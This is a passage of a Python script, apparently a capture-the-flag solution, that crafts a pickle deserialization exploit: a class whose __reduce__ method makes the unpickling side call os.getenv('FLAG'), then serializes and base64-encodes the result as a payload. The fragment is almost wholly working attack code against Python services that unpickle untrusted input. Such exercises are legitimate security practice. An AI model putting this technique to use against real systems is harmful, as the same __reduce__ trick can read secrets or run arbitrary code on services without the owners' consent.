print("="*60)

# Alternative approach - try to get a specific env var
class ExploitAlt:
    def __reduce__(self):
        # Use getattr to call os.getenv which will be serialized
        return (os.getenv, ('FLAG', 'FLAG_NOT_FOUND'))

exploit_alt = ExploitAlt()
serialized_alt = pickle.dumps(exploit_alt, protocol=4)
payload_alt_b64 = base64.b64encode(serialized_alt).decode()

print(f"Alternative payload (gets FLAG env var):")
